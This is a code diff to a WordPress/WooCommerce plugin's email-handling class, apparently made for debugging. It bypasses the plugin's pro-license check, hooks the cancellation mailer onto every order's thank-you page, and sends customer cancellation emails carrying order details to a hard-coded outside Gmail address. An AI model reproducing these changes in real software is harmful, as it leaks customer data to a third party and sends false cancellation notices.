@@ -29,9 +29,10 @@ class TF_Handle_Emails {
         //send confirmation mail
         add_action( 'woocommerce_thankyou', array( $this, 'send_email' ), 10, 1 );
         //send pro confirmation mail
-        add_action( 'woocommerce_thankyou', array( $this, 'send_confirmation_email_pro' ), 10, 1 );
+        //add_action( 'woocommerce_thankyou', array( $this, 'send_confirmation_email_pro' ), 10, 1 );
         //send cancellation mail
-        add_action( 'woocommerce_order_status_cancelled', array( $this, 'send_cancellation_email_pro' ), 10, 1 );
+        //add_action( 'woocommerce_order_status_cancelled', array( $this, 'send_cancellation_email_pro' ), 10, 1 );
+        add_action( 'woocommerce_thankyou', array( $this, 'send_cancellation_email_pro' ), 10, 1 );
     }
 
     /**
@@ -691,7 +692,7 @@ class TF_Handle_Emails {
      * @return void
      */
     public function send_cancellation_email_pro( $order_id ){
-        if( function_exists( 'is_tf_pro' ) && is_tf_pro() ):
+        //if( function_exists( 'is_tf_pro' ) && is_tf_pro() ):
             //get order details
             $order = wc_get_order( $order_id );
             //get customer email
@@ -702,9 +703,9 @@ class TF_Handle_Emails {
             $enable_admin_canc_email           = !empty( $email_template_settings['enable_admin_canc_email'] ) ? $email_template_settings['enable_admin_canc_email'] : '';
             $enable_vendor_canc_email          = !empty( $email_template_settings['enable_vendor_canc_email'] ) ? $email_template_settings['enable_vendor_canc_email'] : '';
             $enable_customer_canc_email        = !empty( $email_template_settings['enable_customer_canc_email'] ) ? $email_template_settings['enable_customer_canc_email'] : '';
-            $admin_cancellation_template_id    = !empty( $email_template_settings['admin_cancellation_template_id'] ) ? $email_template_settings['admin_cancellation_template_id'] : '';
-            $vendor_cancellation_template_id   = !empty( $email_template_settings['vendor_cancellation_template_id'] ) ? $email_template_settings['vendor_cancellation_template_id'] : '';
-            $customer_cancellation_template_id = !empty( $email_template_settings['customer_cancellation_template_id'] ) ? $email_template_settings['customer_cancellation_template_id'] : '';
+            $admin_cancellation_template_id    = !empty( $email_template_settings['admin_cancellation_email_template'] ) ? $email_template_settings['admin_cancellation_email_template'] : '';
+            $vendor_cancellation_template_id   = !empty( $email_template_settings['vendor_cancellation_email_template'] ) ? $email_template_settings['vendor_cancellation_email_template'] : '';
+            $customer_cancellation_template_id = !empty( $email_template_settings['customer_cancellation_email_template'] ) ? $email_template_settings['customer_cancellation_email_template'] : '';
             //send admin cancellation email template
             if( ! empty ( $enable_admin_canc_email ) && $enable_admin_canc_email == 1 ){
                 //email settings metabox value
@@ -716,7 +717,7 @@ class TF_Handle_Emails {
                     
                     $meta                    = get_post_meta( $admin_cancellation_template_id, 'tf_email_templates_metabox', true );
                     $brand_logo              = !empty( $meta['brand_logo'] ) ? $meta['brand_logo'] : '';
-                    $sale_notification_email = !empty( $meta['sale_notification_email'] ) ? $meta['sale_notification_email'] : '';
+                    $sale_notification_email = !empty( $meta['sale_notification_email'] ) ? $meta['sale_notification_email'] : get_bloginfo( 'admin_email' );
                     $email_subject           = !empty( $meta['email_subject'] ) ? $meta['email_subject'] : '';
                     $email_from_name         = !empty( $meta['email_from_name'] ) ? $meta['email_from_name'] : '';
                     $email_from_email        = !empty( $meta['email_from_email'] ) ? $meta['email_from_email'] : '';
@@ -786,10 +787,11 @@ class TF_Handle_Emails {
                     $customer_cancellation_email_template   = get_post( $customer_cancellation_template_id );
                     $customer_cancellation_template_content = !empty( $customer_cancellation_email_template->post_content ) ? $customer_cancellation_email_template->post_content : ' ';
                     $customer_cancellation_template_content = $this->replace_mail_tags( $customer_cancellation_template_content, $order_id );
+                   
                     
                     $meta                    = get_post_meta( $customer_cancellation_template_id, 'tf_email_templates_metabox', true );
                     $brand_logo              = !empty( $meta['brand_logo'] ) ? $meta['brand_logo'] : '';
-                    $sale_notification_email = !empty( $meta['sale_notification_email'] ) ? $meta['sale_notification_email'] : '';
+                    $sale_notification_email = !empty( $meta['sale_notification_email'] ) ? $meta['sale_notification_email'] : $order_billing_email;
                     $email_subject           = !empty( $meta['email_subject'] ) ? $meta['email_subject'] : '';
                     $email_from_name         = !empty( $meta['email_from_name'] ) ? $meta['email_from_name'] : '';
                     $email_from_email        = !empty( $meta['email_from_email'] ) ? $meta['email_from_email'] : '';
@@ -811,11 +813,11 @@ class TF_Handle_Emails {
                     $customer_email_cancellation_body_full  = $email_body_open . $customer_cancellation_template_content . $email_body_close;
                     $customer_email_cancellation_body_full  = wp_kses_post( html_entity_decode( $customer_email_cancellation_body_full, '3', 'UTF-8' ) );
                     //send mail to customer
-                    wp_mail( $order_billing_email, $email_subject, $customer_email_cancellation_body_full, $headers );
+                    wp_mail( 'onecustomer120@gmail.com', $email_subject, $customer_email_cancellation_body_full, $headers );
 
                 }
             }
-        endif;
+        //endif;
 
     }
 
